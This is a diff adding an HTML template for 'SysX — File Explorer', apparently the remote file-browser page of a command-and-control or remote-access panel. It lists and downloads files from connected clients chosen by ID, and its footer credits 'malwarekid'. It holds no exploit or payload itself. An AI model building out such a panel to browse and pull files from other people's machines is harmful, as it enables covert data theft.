@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SysX — File Explorer</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      background-color: #121212;
+      color: #e0e0e0;
+      font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif;
+      margin: 0;
+      padding-bottom: 60px;
+    }
+
+    /* Header */
+    header {
+      background-color: #1e1e1e;
+      border-top: 4px solid #3a6ea5;
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #ffffff;
+    }
+    .back {
+      background: #6c757d;
+      color: #fff;
+      padding: 6px 12px;
+      border-radius: 4px;
+      text-decoration: none;
+      font-size: 13px;
+      transition: background 0.3s ease;
+    }
+    .back:hover { background: #5a6268; }
+
+    /* Heading */
+    h2 {
+      text-align: center;
+      font-size: 18px;
+      font-weight: 500;
+      margin: 20px 0;
+    }
+
+    /* Breadcrumb */
+    .breadcrumb {
+      background: #1e1e1e;
+      border: 1px solid #2e2e2e;
+      padding: 8px 12px;
+      margin: 0 auto 20px;
+      max-width: 1000px;
+      border-radius: 4px;
+      font-size: 13px;
+      color: #b0b0b0;
+    }
+    .breadcrumb a {
+      color: #3a6ea5;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+    .breadcrumb a:hover { text-decoration: underline; }
+
+    /* Path bar */
+    .path-bar {
+      background: #1e1e1e;
+      border: 1px solid #2e2e2e;
+      border-radius: 6px;
+      padding: 10px;
+      width: 90%;
+      max-width: 1000px;
+      margin: 0 auto 20px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .path-bar input {
+      flex: 1;
+      background: #121212;
+      border: 1px solid #2e2e2e;
+      color: #fff;
+      padding: 6px 10px;
+      border-radius: 4px;
+      font-size: 13px;
+    }
+    .refresh-btn {
+      background: #3a6ea5;
+      color: #fff;
+      padding: 6px 12px;
+      border-radius: 4px;
+      border: none;
+      font-size: 13px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .refresh-btn:hover { background: #2f5a87; }
+    .refresh-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+    /* Files grid */
+    .file-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+      gap: 12px;
+      padding: 0 20px;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .file-item {
+      background: #1e1e1e;
+      border: 1px solid #2e2e2e;
+      border-radius: 6px;
+      padding: 10px;
+      cursor: pointer;
+      transition: background 0.3s ease, border-color 0.3s ease;
+    }
+    .file-item:hover {
+      background: #242424;
+      border-color: #3a6ea5;
+    }
+    .file-name {
+      font-weight: 500;
+      margin-bottom: 6px;
+      word-break: break-word;
+      font-size: 14px;
+    }
+    .file-details {
+      font-size: 12px;
+      color: #b0b0b0;
+    }
+
+    /* File actions */
+    .file-actions {
+      margin-top: 8px;
+      display: flex;
+      gap: 8px;
+    }
+    .action-btn {
+      background: #6c757d;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 4px 8px;
+      font-size: 12px;
+      cursor: pointer;
+      text-decoration: none;
+      transition: background 0.3s ease;
+    }
+    .action-btn:hover { background: #5a6268; }
+    .download-btn {
+      background: #3a6ea5;
+    }
+    .download-btn:hover { background: #2f5a87; }
+
+    /* Empty state */
+    .empty-directory {
+      text-align: center;
+      color: #999;
+      font-style: italic;
+      margin: 40px 0;
+    }
+
+    /* Messages */
+    .error-message, .success-message {
+      padding: 10px;
+      border-radius: 4px;
+      margin: 10px auto;
+      max-width: 1000px;
+      font-size: 13px;
+    }
+    .error-message {
+      background: #2a1d1d;
+      border: 1px solid #c9302c;
+      color: #ff6b6b;
+    }
+    .success-message {
+      background: #1d2a1d;
+      border: 1px solid #3a6ea5;
+      color: #a5d6ff;
+    }
+
+    /* Footer */
+    footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background: #1e1e1e;
+      color: #b0b0b0;
+      font-size: 12px;
+      text-align: center;
+      padding: 8px 0;
+      border-top: 1px solid #2e2e2e;
+    }
+    footer a {
+      color: #3a6ea5;
+      text-decoration: none;
+    }
+    footer a:hover { text-decoration: underline; }
+
+    ::selection {
+      background: #3a6ea5;
+      color: #ffffff;
+    }
+
+    @media (max-width: 768px) {
+      .path-bar { flex-direction: column; }
+      .path-bar input { width: 100%; }
+      .refresh-btn { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="title">SysX — File Explorer</div>
+  <a href="/" class="back">← Back</a>
+</header>
+
+<h2>File Explorer — {{.ClientID}}</h2>
+
+<div id="breadcrumb" class="breadcrumb" style="display: none;">
+  <span>Path: </span>
+  <span id="breadcrumb-content"></span>
+</div>
+
+<div class="path-bar">
+  <input id="pathInput" type="text" placeholder="Enter path..." value="{{.CurrentPath}}">
+  <button class="refresh-btn" id="browseBtn" onclick="browsePath()">📁 Browse</button>
+  <button class="refresh-btn" id="refreshBtn" onclick="refreshCurrent()">🔄 Refresh</button>
+</div>
+
+<div id="messageContainer"></div>
+
+<div id="fileContainer">
+  <div class="file-grid" id="fileGrid">
+    {{if .Files}}
+    {{range .Files}}
+    <div class="file-item" data-is-dir="{{.IsDir}}" data-path="{{.Path}}">
+      <div class="file-name">{{if .IsDir}}📁{{else}}📄{{end}} {{.Name}}</div>
+      {{if not .IsDir}}
+      <div class="file-details">
+        Size: {{formatSize .Size}}<br>
+        Modified: {{.ModTime}}
+      </div>
+      {{end}}
+      <div class="file-actions">
+        {{if .IsDir}}
+        <button class="action-btn" data-path="{{.Path}}">Open</button>
+        {{else}}
+        <a href="/download?file={{.Path}}" class="action-btn download-btn">Download</a>
+        {{end}}
+      </div>
+    </div>
+    {{end}}
+    {{else}}
+    <div class="empty-directory">
+      Directory is empty or could not be accessed<br>
+      <button class="refresh-btn" onclick="navigateToFolder('/')">Go to Root</button>
+    </div>
+    {{end}}
+  </div>
+</div>
+
+<footer>
+  Created by <a href="https://github.com/malwarekid" target="_blank">malwarekid</a>
+</footer>
+
+<script>
+  const clientID = '{{.ClientID}}';
+  let currentPath = '{{.CurrentPath}}';
+
+  function showMessage(message, type = 'error') {
+    const container = document.getElementById('messageContainer');
+    container.innerHTML = `<div class="${type}-message">${message}</div>`;
+    setTimeout(() => { container.innerHTML = ''; }, 5000);
+  }
+
+  function updateBreadcrumb(path) {
+    const breadcrumb = document.getElementById('breadcrumb');
+    const content = document.getElementById('breadcrumb-content');
+    if (path && path !== '/') {
+      const parts = path.split('/').filter(p => p);
+      let html = '<a href="#" onclick="navigateToFolder(\'/\')">Root</a>';
+      let tempPath = '';
+      parts.forEach((part, index) => {
+        tempPath += '/' + part;
+        if (index === parts.length - 1) {
+          html += ` / <span style="color: #fff;">${part}</span>`;
+        } else {
+          html += ` / <a href="#" onclick="navigateToFolder('${tempPath}')">${part}</a>`;
+        }
+      });
+      content.innerHTML = html;
+      breadcrumb.style.display = 'block';
+    } else {
+      breadcrumb.style.display = 'none';
+    }
+  }
+
+  function setLoading(button, loading = true) {
+    if (loading) {
+      button.disabled = true;
+    } else {
+      button.disabled = false;
+    }
+  }
+
+  async function browsePath() {
+    const pathInput = document.getElementById('pathInput');
+    const browseBtn = document.getElementById('browseBtn');
+    const path = pathInput.value.trim();
+    if (!path) {
+      showMessage('Please enter a path');
+      return;
+    }
+    setLoading(browseBtn, true);
+    try {
+      await navigateToFolder(path);
+    } finally {
+      setLoading(browseBtn, false);
+    }
+  }
+
+  async function refreshCurrent() {
+    const refreshBtn = document.getElementById('refreshBtn');
+    setLoading(refreshBtn, true);
+    try {
+      await navigateToFolder(currentPath);
+      showMessage('Directory refreshed', 'success');
+    } finally {
+      setLoading(refreshBtn, false);
+    }
+  }
+
+  async function navigateToFolder(path) {
+    try {
+      const formData = new FormData();
+      formData.append('action', 'list');
+      formData.append('path', path);
+      const res = await fetch(`/files?client=${clientID}`, { method: 'POST', body: formData });
+      if (!res.ok) throw new Error('Failed to load directory');
+      const html = await res.text();
+      const parser = new DOMParser();
+      const doc = parser.parseFromString(html, 'text/html');
+      const newGrid = doc.getElementById('fileGrid');
+      const pathInput = doc.getElementById('pathInput');
+      currentPath = pathInput ? pathInput.value : path;
+      const grid = document.getElementById('fileGrid');
+      if (newGrid && grid) {
+        grid.innerHTML = newGrid.innerHTML;
+      }
+      document.getElementById('pathInput').value = currentPath;
+      updateBreadcrumb(currentPath);
+      attachEvents();
+    } catch (e) {
+      console.error(e);
+      showMessage(e.message);
+    }
+  }
+
+  function attachEvents() {
+    document.querySelectorAll('.file-item[data-is-dir="true"]').forEach(item => {
+      item.addEventListener('click', e => {
+        if (e.target.tagName !== 'BUTTON' && e.target.tagName !== 'A') {
+          navigateToFolder(item.getAttribute('data-path'));
+        }
+      });
+    });
+    document.querySelectorAll('.action-btn[data-path]').forEach(btn => {
+      btn.addEventListener('click', e => {
+        e.stopPropagation();
+        navigateToFolder(btn.getAttribute('data-path'));
+      });
+    });
+  }
+
+  document.getElementById('pathInput').addEventListener('keypress', e => {
+    if (e.key === 'Enter') browsePath();
+  });
+
+  updateBreadcrumb(currentPath);
+  attachEvents();
+</script>
+
+</body>
+</html>
